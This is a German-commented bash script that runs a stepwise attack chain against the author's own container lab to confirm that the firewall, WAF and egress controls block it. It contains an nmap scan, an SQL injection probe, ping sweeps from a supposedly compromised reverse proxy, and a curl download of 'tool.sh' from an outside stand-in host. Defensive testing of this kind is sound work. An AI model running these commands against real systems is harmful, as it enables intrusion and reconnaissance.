#!/usr/bin/env bash
# Kette B - externer verketteter Angriff, als Nachweis dass die Abwehr haelt.
# Alle Schritte richten sich gegen das EIGENE Labor und sollen scheitern.
# Schritt fuer Schritt per Enter. Aufruf: sudo ./attacks/kette-b.sh
set -uo pipefail
P=clab-solodmz
step(){ echo; echo "=== $* ==="; read -rp "   [Enter] ausfuehren "; }
A(){ docker exec "$P-ang-internet" "$@"; }
R(){ docker exec "$P-rproxy" "$@"; }

step "B1  Portscan auf die oeffentliche IP (erwartet: nur wenige/keine offenen Ports)"
A nmap -n -Pn --max-retries 1 --host-timeout 20s -p 22,80,443,445,3389,51820 198.51.100.2 || true

step "B2  SQLi-Probe gegen die WAF (erwartet: 403)"
A sh -c "curl -sk -o /dev/null -w 'HTTP %{http_code}\n' --max-time 5 \"https://198.51.100.2/?id=1%27%20OR%20%271%27=%271\""

step "B3  Annahme: rproxy ist uebernommen (wir arbeiten jetzt von dort)"
echo "   -> ab hier Aktionen aus Sicht des rproxy"

step "B4  Ausbruch ins Netz: Scan auf VPN-GW / Client / Backend (erwartet: blockiert)"
R sh -c "for t in 10.0.10.34 10.0.20.10 10.0.30.11; do ping -c1 -W2 \$t >/dev/null 2>&1 && echo \"\$t ERREICHBAR (unerwartet)\" || echo \"\$t blockiert\"; done"

step "B5  Werkzeug aus dem Internet nachladen (erwartet: kein Egress, blockiert)"
R sh -c "curl -s --max-time 4 http://203.0.113.10/tool.sh >/dev/null 2>&1 && echo 'Download OK (unerwartet)' || echo 'Download blockiert (EDGE-DROP)'"

echo; echo "Kette B abgeschlossen. Spuren im SOC pruefen (EDGE-DROP, WAF-403, IDS-Uplink)."
